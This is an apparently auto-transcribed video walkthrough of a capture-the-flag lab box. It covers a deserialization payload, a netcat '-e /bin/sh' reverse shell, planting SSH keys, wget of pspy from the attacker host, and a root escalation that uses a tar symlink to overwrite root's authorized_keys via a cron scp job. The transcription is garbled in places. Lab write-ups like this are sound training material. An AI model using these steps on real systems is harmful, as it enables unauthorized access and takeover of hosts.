that's in handler on the server so it's responding with this message so let's see action that string payload send receive this is the error message we got so let's try different common collections let's try common collections five see if this is it copy go here go back to our payload highlighted way too much paste run successfully connected failure while recovering user object let's run this again it's excellent connected have that error but we get a connection here and this is where a lot of time was wasted trying to find like a reverse shell because we're in a docker container that's really stripped down but the netcat version here has a dash e flag so if we do dash e bin sh i'm just gonna save you the like hours and hours of sending random reverse shell payloads and trying to write a ssh key file to sshn like lots of time got wasted here but we can try this reverse shell method paste run probably need to listen i am listening connection received if i do ls we're here so if i type like bash uh which bash i don't think bash exist which cat yeah bash doesn't exist so we can't do that bash shell payload uh that nc payload was causing me issues because of all the like random characters in it it was just a pain and then to top it off when i do which python which python3 i don't have python in this so i can't upgrade my tty um which script another method to get a tty can't do that so we won't be able to do that sd2y trick to get tab auto complete control c and all those things [Music] ls bin we can look at the shells and there is a ash shell so if we do ash let's do ash two and one hash dash i that's gonna be interactive and that's going to redirect standard error to standard out we can get something that looks okay so lsla user.txt is owned by us but it's ch modded to zeros so we can chmod it to the good old 777 since we own it we can now grab that file there is an ssh directory so we can try dropping a key in here so let's go sh dash key gen uh dash f test or i'm going to do root or i wish i was better at naming things let's just do qtc.pub we can grab this copy echo this into was it where am i i'm in ssh so authorized keys permission denied uh chmod 777 on that okay and then echo that authorized keys sage mod i guess 600 off if that file 777 it won't work i don't think so there we go so we can try now doing a ch mod 600 on our private key sh-i qtc at 10 10 10 174 we need to specify the file and we get permission denied so let's see do we have ssh dash key scan do we have that here which ssh key scan we do so sh key scan dash t rsa 12701 t rsa 10 10 10 174 and just looking at the and zqf we have different ssh servers so let's go all the way back to the beginning where we did a full nmap port scan to see if there's another ssh port so cat fatty all ports dot add map uh let's see let's do nc 172. but 10 10 10 174 22. okay let's try one three three seven we don't get that eight nine so it doesn't look like we have another ssh server so we are stuck in that docker container with this shell um we could try like just poking around lsla on slash let's do etsy cron tabs try to cat qtc cat root look around on etsy to see if there's anything modules i don't really see anything too interesting oh there is a order we own crontabs.back and if you did like a fine slash uh dash user qtc to devnull i think this will be a better thing of showing it um find slash user qtc dash ls so we can see file permissions to devnl do not like that ls maybe this version does not have it okay type it to less doesn't have less either but we can see all the files owned by qtc we probably want to exclude proc uh prep dash v prep sv proc to devnol opt fatty but we do have a cron tabs backup folder so if we cut that we can see what's happening on the crons root doesn't really have anything but we have this weird tar command it's going to turn some log files to opt fatty logs so opt fatty logs we can just see oh it's taking these logs and creating this to our file so opt fatty tar and we have logs.tar so let's run piece by to see what happens on this box so is it pspy yeah so we're going to download this and i'm going to get the big static version because we're in a docker container and we may not have like stuff for this small one to work so let's see make dirt dub dub dub and then let's move downloads piece by here let's go into dev shm and then wr which girl which w get so we have w get on the box 10 10 14 3 uh pspy 64. python 3. dash m http server 80 run it sage mod plus x and we can execute it do a mount cat etsy fs tab let's see i wonder if we just can't execute out of dev shm cp pspy64 to temp there we go so i guess we just can't execute out of uh shm but we can see all the files running on the box and all the processes are running on the box and as new processes start up we will get them so i'm just going to let this sit for probably five minutes and we'll see if we get a hit so after some time we can see uh something coming in and running scp-f and copying this so since we don't see both source and destination for scp this the scp binary on this giving a server the file so since this is pulling the logs.ter multiple times we may be able to exploit this um this one is kind of tough to explain so we're going to do it and as we do it we're going to explain it because you got to wait like 60 seconds between it but essentially we're going to have two phases of this exploit first we have to get a shell again since i control c that ps buy so go back to eclipse run get a shell okay i'm gonna do ash dash i two and one so let's go in dev shm so the very first thing we're going to do is create a folder called exploit and inside of exploit we are going to ln s root ssh authorized keys to logs.tar so we do a lsla we have a sim link logs.tar is pointing to the authorized keys file and glad i caught this but authorized keys logs.tar yeah okay and exist rm log star now let's copy this again okay so i'm going to go up one directory i'm going to do tar c vf logs.tar capital c to change directory before running this and go into exploit and let's see we probably have to do like uh this i screwed something up tur tvf logs.tara yeah so haram logs.cf logs.c exploit logs.tar okay that time it didn't err so now when i do a tar against this we see this tar archive contains a sim link that points to itself so if you untur it it's going to be itself so let's copy logs.tar into exploit go into exploit and did lsla we can see logs that terms like that ter xf logs dot ter uh we should do v v f logs logs.ter so we just extracted logs.tar from logs.tar and now it's a sim link that points to the authorized key file so because of this when the exploit goes into overwrite this file it's pointed to authorized key and we'll be able to drop a file there so let's copy logs.tar to wherever that cron is that was opt fatty here so copy it over top of this and then what i'm going to do is i'm just gonna we'll sleep 60 actually and then let's do cat um home qtc ssh authorized keys and we got our key here we got someone else's key but that should be fine so when that sleep finishes i'm going to copy this file over top of this file and then we're going to wait another minute and see if the server overwrote authorized keys because it thinks logs.tar is assembling two authorized keys it's confusing but yeah we'll see if it works so that sleep command has finished so we just copied the file back and we're going to run the sleep again and then i'm also going to sh-i qtc i'm going to assume this is the root so 10 10 10 174 and we get permission denied but we can do 4 i n sec 0 30 do sleep one done permission denied so we're going to be trying to sshn for 30 seconds and hopefully within 30 seconds we get in if not we'll go that full minute and there we go so vectron finally ran and copied the file and here we go we're in the box has root so we can do wc-c root dot text and again let's look at the cron tabs so cron tab dash l so it's running log polar every minute so let's look at log polar oh god uh where's it see paying to grip scp so strict host key id rsa to what this file client two okay let's just try this again so cp tvf logs.tar this is the sim link one so let's copy logs.tar to here and now when the log polo runs which will be in 30 seconds we should see one of these clients have i don't know what this even odd thing is uh find can i do client star client1 even logs. so lsla on this so when it unturns this file so let's do tar was it tvf cannot open client one odd it's probably got some weird logic so this thing works through multiple people's exploiting it so we can see this client one odd is currently a symbolic link to root ssh authorized keys so lsla this file so now when it tries to copy to client one odd it's going to overwrite this ssh key so again let's look at logpolar.sh uh yeah so even is when it comes from you odd is when it extracts it i guess so it's copying this which eventually is the authorized key file we upload over top of this which is really just a sim link to um the authorized key file probably confusing you more by just keeping on explaining it but hope you guys enjoyed the video take care and i will see you all next week